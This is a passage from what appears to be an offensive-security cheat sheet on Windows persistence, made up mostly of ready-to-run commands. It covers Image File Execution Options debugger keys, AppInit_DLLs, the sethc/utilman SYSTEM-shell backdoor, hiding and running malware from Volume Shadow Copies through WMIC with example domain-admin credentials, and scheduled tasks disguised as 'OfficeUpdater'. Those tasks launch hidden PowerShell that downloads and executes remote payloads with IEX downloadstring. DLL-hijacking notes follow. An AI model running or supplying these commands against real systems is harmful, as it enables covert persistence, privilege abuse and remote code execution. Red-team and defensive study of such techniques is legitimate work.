</td></tr></table>

<h5 id="list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run">List Image File Execution Options (Debugger file executed when the target file is run)<a class="headerlink" href="#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">HKLM</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">MS</span><span class="err">\</span><span class="n">WindowsNT</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Image</span> <span class="n">File</span> <span class="n">Execution</span> <span class="k">Options</span><span class="err">\</span><span class="n">notepad</span><span class="p">.</span><span class="n">exe</span><span class="err">\</span><span class="n">debugger</span><span class="p">(</span><span class="n">REG_SZ</span> <span class="o">=</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span>
</pre></div>
</td></tr></table>

<h5 id="appinit_dlls">AppInit_DLLs<a class="headerlink" href="#appinit_dlls" title="Permanent link">&para;</a></h5>
<p>Load custom DLLs each time a program runs (If it loads USER32.dll).  This is checked by most AV!</p>
<p>This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">HKLM</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">AppInit_DLLs</span>
</pre></div>
</td></tr></table></p>
<h5 id="no-reboot-sethcutilman-option-using-a-debugger-key">No-reboot sethc/utilman option using a "debugger" key<a class="headerlink" href="#no-reboot-sethcutilman-option-using-a-debugger-key" title="Permanent link">&para;</a></h5>
<p>Navigate to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
Make key called "sethc.exe"
Make a REG_SQ value called "Debugger"
Assign it "c:\windows\system32\cmd.exe" as the value
Hit SHIFT 5 times and get a shell as nt authority\system
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">reg</span> <span class="k">add</span> <span class="ss">&quot;\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> <span class="o">/</span><span class="n">v</span> <span class="n">Debugger</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="o">/</span><span class="n">d</span> <span class="ss">&quot;c:\windows\system32\cmd.exe&quot;</span>
    <span class="n">reg</span> <span class="k">add</span> <span class="ss">&quot;\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot;</span> <span class="o">/</span><span class="n">v</span> <span class="n">Debugger</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="o">/</span><span class="n">d</span> <span class="ss">&quot;c:\windows\system32\cmd.exe&quot;</span>
</pre></div>
</td></tr></table></p>
<p>Remove the debugger key
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">reg</span> <span class="k">delete</span> <span class="ss">&quot;\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> <span class="o">/</span><span class="n">f</span>
    <span class="n">reg</span> <span class="k">delete</span> <span class="ss">&quot;\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot;</span> <span class="o">/</span><span class="n">f</span>
</pre></div>
</td></tr></table></p>
<h4 id="file-storage-locations">File Storage Locations<a class="headerlink" href="#file-storage-locations" title="Permanent link">&para;</a></h4>
<h5 id="startup-folders">Startup Folders<a class="headerlink" href="#startup-folders" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">#</span><span class="k">All</span> <span class="n">Users</span> <span class="o">-</span> <span class="n">Windows</span> <span class="n">XP</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Documents</span> <span class="k">and</span> <span class="n">Settings</span><span class="err">\</span><span class="k">All</span> <span class="n">Users</span><span class="err">\</span><span class="k">Start</span> <span class="n">Menu</span><span class="err">\</span><span class="n">Programs</span><span class="err">\</span><span class="n">Startup</span>

    <span class="o">#</span><span class="k">All</span> <span class="n">Users</span> <span class="o">-</span> <span class="n">Windows</span> <span class="n">Vista</span><span class="o">+</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">ProgramData</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="k">Start</span> <span class="n">Menu</span><span class="err">\</span><span class="n">Programs</span><span class="err">\</span><span class="n">Startup</span>

    <span class="o">#</span><span class="k">User</span> <span class="n">Profile</span> <span class="o">-</span> <span class="n">Windows</span> <span class="n">XP</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Documents</span> <span class="k">and</span> <span class="n">Settings</span><span class="err">\</span><span class="o">&lt;</span><span class="n">USERNAME</span><span class="o">&gt;</span><span class="err">\</span><span class="k">Start</span> <span class="n">Menu</span><span class="err">\</span><span class="n">Programs</span><span class="err">\</span><span class="n">Startup</span>

    <span class="o">#</span><span class="k">User</span> <span class="n">Profile</span> <span class="o">-</span> <span class="n">Windows</span> <span class="n">Vista</span><span class="o">+</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="o">&lt;</span><span class="n">USERNAME</span><span class="o">&gt;</span><span class="err">\</span><span class="n">AppData</span><span class="err">\</span><span class="n">Roaming</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="k">Start</span> <span class="n">Menu</span><span class="err">\</span><span class="n">Programs</span><span class="err">\</span><span class="n">Startup</span>
</pre></div>
</td></tr></table>

<h5 id="sethcutilman-replacement">SETHC/UTILMAN Replacement<a class="headerlink" href="#sethcutilman-replacement" title="Permanent link">&para;</a></h5>
<p>Replace these binaries, may require a reboot to take effect
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="c">%WINDIR%\System32\sethc.exe</span>
    <span class="c">%WINDIR%\System32\utilman.exe</span>
</pre></div>
</td></tr></table></p>
<p>Hit shift 5 times = sethc.exe run by SYSTEM
Windows key + U = utilman.exe run by SYSTEM</p>
<h5 id="volume-shadow-copy-restore-points">Volume Shadow Copy (Restore Points)<a class="headerlink" href="#volume-shadow-copy-restore-points" title="Permanent link">&para;</a></h5>
<p>Windows service that's constantly running - takes snapshots of system directories</p>
<p>Drop Malware -&gt; Create VSC (ReadOnly) -&gt; Delete Malware -&gt; Use WMIC to run VSC of malware</p>
<p>Registry Key to Disable Volume Shadow Copy
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">HKLM</span><span class="err">\</span><span class="k">System</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Control</span><span class="err">\</span><span class="n">BackupRestore</span><span class="err">\</span><span class="n">FilesNotToSnapshot</span>
</pre></div>
</td></tr></table></p>
<h5 id="vssadmin-native-windows-utility">VSSADMIN - native windows utility<a class="headerlink" href="#vssadmin-native-windows-utility" title="Permanent link">&para;</a></h5>
<p>vssadmin create command only applies to Server OS (Win2k3,2008)<br />
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">vssadmin</span> <span class="nv">list</span> <span class="nv">shadows</span>  
    <span class="nv">vssadmin</span> <span class="nv">create</span> <span class="nv">shadow</span> <span class="o">/</span><span class="k">for</span><span class="o">=</span><span class="nv">C</span>:  
    <span class="nv">wmic</span> <span class="o">/</span><span class="nv">node</span>:<span class="nv">DC1</span> <span class="o">/</span><span class="nv">user</span>:<span class="nv">DOMAIN</span>\<span class="nv">domainadminsvc</span> <span class="o">/</span><span class="nv">password</span>:<span class="nv">domainadminsvc123</span> <span class="nv">process</span> <span class="k">call</span> <span class="nl">create</span> <span class="s2">&quot;</span><span class="s">cmd /c vssadmin create shadow /for=C  </span>
    <span class="nv">mklink</span> <span class="o">/</span><span class="nv">D</span> <span class="nv">C</span>:\<span class="nv">VscAccess</span> \\?\<span class="nv">GLOBALROOT</span>\<span class="nv">Device</span>\<span class="nv">HardDiskVolumeShadowCopy1</span>  
    <span class="nv">copy</span> \\?\<span class="nv">GLOBALROOT</span>\<span class="nv">Device</span>\<span class="nv">HardDiskVolumeShadowCopy4</span>\<span class="nv">path</span>\<span class="nv">to</span>\<span class="nv">some</span>\<span class="nv">file</span> <span class="nv">e</span>:\<span class="nv">files</span>  
</pre></div>
</td></tr></table></p>
<h5 id="use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy">Use WMIC process call to run an .exe from a Volume Shadow Copy<a class="headerlink" href="#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">wmic</span> <span class="n">process</span> <span class="k">call</span> <span class="k">create</span> <span class="err">\\</span><span class="p">.</span><span class="err">\</span><span class="n">GLOBALROOT</span><span class="err">\</span><span class="n">Device</span><span class="err">\</span><span class="n">HarddiskVolumeShadowCopy1</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">evil</span><span class="p">.</span><span class="n">exe</span>
</pre></div>
</td></tr></table>

<p>This process will not show the imagename (executable filename) or commandline parameters in the task list.
The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it.<br />
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="n">root</span><span class="nv">@kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">wmis</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="k">DOMAIN</span><span class="err">\</span><span class="n">domainadminsvc</span><span class="o">%</span><span class="n">domainadminsvc123</span><span class="w"> </span><span class="o">//</span><span class="n">ServerName</span><span class="w"> </span><span class="err">\\</span><span class="vm">?</span><span class="err">\</span><span class="n">GLOBALROOT</span><span class="err">\</span><span class="n">Device</span><span class="err">\</span><span class="n">HarddiskVolumeShadowCopy1</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">evil</span><span class="p">.</span><span class="n">exe</span><span class="w">  </span>
<span class="w">    </span><span class="nl">NTSTATUS</span><span class="p">:</span><span class="w"> </span><span class="n">NT_STATUS_OK</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Success</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<p>In Kali Linux you could use the WMIS package to do the same thing:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">wmis</span> <span class="o">-</span><span class="n">U</span> <span class="k">DOMAIN</span><span class="err">\</span><span class="n">domainadminsvc</span><span class="o">%</span><span class="n">domainadminsvc123</span> <span class="o">//</span><span class="n">ServerName</span> <span class="err">\\</span><span class="o">?</span><span class="err">\</span><span class="n">GLOBALROOT</span><span class="err">\</span><span class="n">Device</span><span class="err">\</span><span class="n">HarddiskVolumeShadowCopy1</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">evil</span><span class="p">.</span><span class="n">exe</span>  
    <span class="n">NTSTATUS</span><span class="p">:</span> <span class="n">NT_STATUS_OK</span> <span class="o">-</span> <span class="n">Success</span>
</pre></div>
</td></tr></table></p>
<h4 id="task-scheduling">Task Scheduling<a class="headerlink" href="#task-scheduling" title="Permanent link">&para;</a></h4>
<h5 id="at">AT<a class="headerlink" href="#at" title="Permanent link">&para;</a></h5>
<p>Executes as system and must be an Admin to run it. Check groups with whoami /groups
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">at</span> <span class="mi">13</span><span class="p">:</span><span class="mi">20</span> <span class="o">/</span><span class="n">interactive</span> <span class="n">cmd</span>

    <span class="n">net</span> <span class="k">user</span> <span class="err">\\</span><span class="n">target</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="k">Domain</span><span class="err">\</span><span class="k">user</span> <span class="n">pass</span>
    <span class="n">net</span> <span class="n">time</span> <span class="err">\\</span><span class="n">target</span>
    <span class="k">at</span> <span class="err">\\</span><span class="n">target</span> <span class="mi">13</span><span class="p">:</span><span class="mi">20</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="n">evil</span><span class="p">.</span><span class="n">bat</span>
</pre></div>
</td></tr></table></p>
<h5 id="schtasks">SCHTASKS<a class="headerlink" href="#schtasks" title="Permanent link">&para;</a></h5>
<p>Any user can create a task</p>
<p>Schedule a binary to run with arguments on system events
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">#</span><span class="k">On</span> <span class="k">System</span> <span class="n">Startup</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">TN</span> <span class="n">OfficeUpdaterA</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;&quot;</span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">evil32</span><span class="p">.</span><span class="n">exe</span><span class="ss">&quot; -k password -n services&quot;</span> <span class="o">/</span><span class="n">SC</span> <span class="n">onstart</span> <span class="o">/</span><span class="n">RU</span> <span class="k">system</span> <span class="o">/</span><span class="n">RL</span> <span class="n">HIGHEST</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">TN</span> <span class="n">OfficeUpdaterD</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;\&quot;</span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">evil32</span><span class="p">.</span><span class="n">exe</span><span class="err">\</span><span class="ss">&quot; -k password -n services&quot;</span> <span class="o">/</span><span class="n">SC</span> <span class="n">onstart</span> <span class="o">/</span><span class="n">RU</span> <span class="k">system</span> <span class="o">/</span><span class="n">RL</span> <span class="n">HIGHEST</span>

    <span class="o">#</span><span class="k">On</span> <span class="k">User</span> <span class="n">Login</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">TN</span> <span class="n">OfficeUpdaterB</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;&quot;</span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">evil32</span><span class="p">.</span><span class="n">exe</span><span class="ss">&quot; -k password -n services&quot;</span> <span class="o">/</span><span class="n">SC</span> <span class="n">onlogon</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">TN</span> <span class="n">OfficeUpdaterE</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;\&quot;</span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">evil32</span><span class="p">.</span><span class="n">exe</span><span class="err">\</span><span class="ss">&quot; -k password -n services&quot;</span> <span class="o">/</span><span class="n">SC</span> <span class="n">onlogon</span>   

    <span class="o">#</span><span class="k">On</span> <span class="n">Idle</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">TN</span> <span class="n">OfficeUpdaterC</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;&quot;</span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">evil32</span><span class="p">.</span><span class="n">exe</span><span class="ss">&quot; -k password -n services&quot;</span> <span class="o">/</span><span class="n">SC</span> <span class="n">onidle</span> <span class="o">/</span><span class="n">i</span> <span class="mi">30</span><span class="s1">&#39;&#39;&#39;&#39;</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">TN</span> <span class="n">OfficeUpdaterF</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;\&quot;</span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">evil32</span><span class="p">.</span><span class="n">exe</span><span class="err">\</span><span class="ss">&quot; -k password -n services&quot;</span> <span class="o">/</span><span class="n">SC</span> <span class="n">onidle</span> <span class="o">/</span><span class="n">i</span> <span class="mi">60</span>
</pre></div>
</td></tr></table></p>
<p>Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exploit\windows\misc\psh_web_delivery'
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">#</span><span class="p">(</span><span class="n">X86</span><span class="p">)</span> <span class="o">-</span> <span class="k">On</span> <span class="k">User</span> <span class="n">Login</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="n">OfficeUpdaterA</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://&lt;ip address&gt;/&lt;uri&gt;&#39;&#39;&#39;))&#39;&quot;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">onlogon</span> <span class="o">/</span><span class="n">ru</span> <span class="k">System</span>

    <span class="o">#</span><span class="p">(</span><span class="n">X86</span><span class="p">)</span> <span class="o">-</span> <span class="k">On</span> <span class="k">System</span> <span class="k">Start</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="n">OfficeUpdaterB</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://&lt;ip address&gt;/&lt;uri&gt;&#39;&#39;&#39;))&#39;&quot;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">onstart</span> <span class="o">/</span><span class="n">ru</span> <span class="k">System</span>

    <span class="o">#</span><span class="p">(</span><span class="n">X86</span><span class="p">)</span> <span class="o">-</span> <span class="k">On</span> <span class="k">User</span> <span class="n">Idle</span> <span class="p">(</span><span class="mi">30</span><span class="n">mins</span><span class="p">)</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="n">OfficeUpdaterC</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://&lt;ip address&gt;/&lt;uri&gt;&#39;&#39;&#39;))&#39;&quot;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">onidle</span> <span class="o">/</span><span class="n">i</span> <span class="mi">30</span>

    <span class="o">#</span><span class="p">(</span><span class="n">X64</span><span class="p">)</span> <span class="o">-</span> <span class="k">On</span> <span class="k">User</span> <span class="n">Login</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="n">OfficeUpdaterA</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://&lt;ip address&gt;/&lt;uri&gt;&#39;&#39;&#39;))&#39;&quot;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">onlogon</span> <span class="o">/</span><span class="n">ru</span> <span class="k">System</span>

    <span class="o">#</span><span class="p">(</span><span class="n">X64</span><span class="p">)</span> <span class="o">-</span> <span class="k">On</span> <span class="k">System</span> <span class="k">Start</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="n">OfficeUpdaterB</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://&lt;ip address&gt;/&lt;uri&gt;&#39;&#39;&#39;))&#39;&quot;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">onstart</span> <span class="o">/</span><span class="n">ru</span> <span class="k">System</span>

    <span class="o">#</span><span class="p">(</span><span class="n">X64</span><span class="p">)</span> <span class="o">-</span> <span class="k">On</span> <span class="k">User</span> <span class="n">Idle</span> <span class="p">(</span><span class="mi">30</span><span class="n">mins</span><span class="p">)</span>
    <span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="n">OfficeUpdaterC</span> <span class="o">/</span><span class="n">tr</span> <span class="ss">&quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://192.168.95.195:8080/kBBldxiub6&#39;&#39;&#39;))&#39;&quot;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">onidle</span> <span class="o">/</span><span class="n">i</span> <span class="mi">30</span>
</pre></div>
</td></tr></table></p>
<h5 id="additional-notes">Additional Notes<a class="headerlink" href="#additional-notes" title="Permanent link">&para;</a></h5>
<p>Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash () AND quotation marks ("):</p>
<p>Delete scheduled task without prompting 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">schtasks</span> <span class="o">/</span><span class="k">delete</span> <span class="o">/</span><span class="n">f</span> <span class="o">/</span><span class="n">TN</span> <span class="n">taskname</span>
</pre></div>
</td></tr></table></p>
<p>Detailed scheduled tasks listing
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">schtasks</span> <span class="o">/</span><span class="n">query</span> <span class="o">/</span><span class="n">V</span> <span class="o">/</span><span class="n">FO</span> <span class="n">list</span>
</pre></div>
</td></tr></table></p>
<p>View scheduled tasks log (for troubleshooting)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">notepad</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">schedlgu</span><span class="p">.</span><span class="n">txt</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">XP</span><span class="p">)</span>

    <span class="n">notepad</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">tasks</span><span class="err">\</span><span class="n">schedlgu</span><span class="p">.</span><span class="n">txt</span> <span class="p">(</span><span class="n">Vista</span><span class="o">+</span><span class="p">)</span>
</pre></div>
</td></tr></table></p>
<h4 id="windows-service">Windows Service<a class="headerlink" href="#windows-service" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">sc</span> <span class="n">query</span>
    <span class="n">sc</span> <span class="k">create</span> <span class="o">&lt;</span><span class="err">\\</span><span class="n">Target</span><span class="p">(</span><span class="n">optional</span><span class="p">)</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">servicename</span><span class="o">&gt;</span> <span class="n">binPath</span><span class="o">=</span> <span class="o">&lt;</span><span class="n">service</span> <span class="nb">binary</span> <span class="n">path</span><span class="o">&gt;</span> <span class="k">type</span><span class="o">=</span> <span class="k">share</span> <span class="k">start</span><span class="o">=</span> <span class="n">auto</span> <span class="n">DisplayName</span><span class="o">=</span> <span class="o">&lt;</span><span class="n">display</span> <span class="n">name</span><span class="o">&gt;</span>
    <span class="n">sc</span> <span class="k">delete</span> <span class="o">&lt;</span><span class="n">servicename</span><span class="o">&gt;</span>
</pre></div>
</td></tr></table>

<h4 id="dll-hijacking">DLL-Hijacking<a class="headerlink" href="#dll-hijacking" title="Permanent link">&para;</a></h4>
<p>Order of DLL Loading
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="mi">1</span><span class="p">.</span> <span class="n">The</span> <span class="n">directory</span> <span class="k">from</span> <span class="n">which</span> <span class="n">the</span> <span class="n">application</span> <span class="k">is</span> <span class="n">loaded</span>
<span class="mi">2</span><span class="p">.</span> <span class="n">The</span> <span class="k">current</span> <span class="n">directory</span>
<span class="mi">3</span><span class="p">.</span> <span class="n">The</span> <span class="k">system</span> <span class="n">directory</span><span class="p">,</span> <span class="n">usually</span> <span class="k">C</span><span class="p">:</span><span class="err">\\</span><span class="n">Windows</span><span class="err">\\</span><span class="n">System32</span><span class="err">\\</span> <span class="p">(</span><span class="n">The</span> <span class="n">GetSystemDirectory</span> <span class="k">function</span> <span class="k">is</span> <span class="k">called</span> <span class="k">to</span> <span class="n">obtain</span> <span class="n">this</span> <span class="n">directory</span><span class="p">.)</span>
<span class="mi">4</span><span class="p">.</span> <span class="n">The</span> <span class="mi">16</span><span class="o">-</span><span class="nb">bit</span> <span class="k">system</span> <span class="n">directory</span> <span class="o">-</span> <span class="n">There</span> <span class="k">is</span> <span class="k">no</span> <span class="n">dedicated</span> <span class="k">function</span> <span class="k">to</span> <span class="n">retrieve</span> <span class="n">the</span> <span class="n">path</span> <span class="k">of</span> <span class="n">this</span> <span class="n">directory</span><span class="p">,</span> <span class="n">but</span> <span class="n">it</span> <span class="k">is</span> <span class="n">searched</span> <span class="k">as</span> <span class="n">well</span><span class="p">.</span>
<span class="mi">5</span><span class="p">.</span> <span class="n">The</span> <span class="n">Windows</span> <span class="n">directory</span><span class="p">.</span> <span class="n">The</span> <span class="n">GetWindowsDirector</span> <span class="k">function</span> <span class="k">is</span> <span class="k">called</span> <span class="k">to</span> <span class="n">obtain</span> <span class="n">this</span> <span class="n">directory</span><span class="p">.</span>
<span class="mi">6</span><span class="p">.</span> <span class="n">The</span> <span class="n">directories</span> <span class="n">that</span> <span class="k">are</span> <span class="n">listed</span> <span class="k">in</span> <span class="n">the</span> <span class="n">PATH</span> <span class="n">environment</span> <span class="k">variable</span><span class="p">.</span>
</pre></div>
</td></tr></table></p>
<p>Many systems use bginfo (seen it a lot in operational sys). Drop Riched32.dll in the dir with bginfo.exe. Codex.</p>
<p>Older list of dlls as well (2010). <a href="https://www.exploit-db.com/dll-hijacking-vulnerable-applications/">https://www.exploit-db.com/dll-hijacking-vulnerable-applications/</a></p>
<p>On Windows 7 there are three executables that could be exploited and associated DLLs listed below
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">ehome</span><span class="err">\</span><span class="n">Mcx2Prov</span><span class="p">.</span><span class="n">exe</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">ehome</span><span class="err">\</span><span class="n">CRYPTBASE</span><span class="p">.</span><span class="n">dll</span>

